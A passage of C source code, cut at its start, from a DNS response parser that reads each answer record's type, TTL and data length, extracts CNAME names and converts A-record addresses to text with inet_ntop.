		ptr += 2; /* move ptr to Type*/
		type = htons(*((unsigned short*)ptr));
		ptr += 4; /* move ptr to Time to live */
		ttl = htonl(*((unsigned int*)ptr));
		ptr += 4; /* move ptr to Data lenth */
		datalen = ntohs(*((unsigned short*)ptr));
		ptr += 2; /* move ptr to Data*/
		if(type == DNS_CNAME)
		{
			bzero(cname , sizeof(cname));
			len = 0;
			parse_dns_name(dnsbuf , ptr , cname , &len);
			ptr += datalen;
		}
		if(type == DNS_HOST)
		{
			if(datalen == 4){
				memcpy(netip , ptr , datalen);
				inet_ntop(AF_INET , netip , result , sizeof(struct sockaddr));
			}
			ptr += datalen;
		}
	}
	ptr += 2;
}

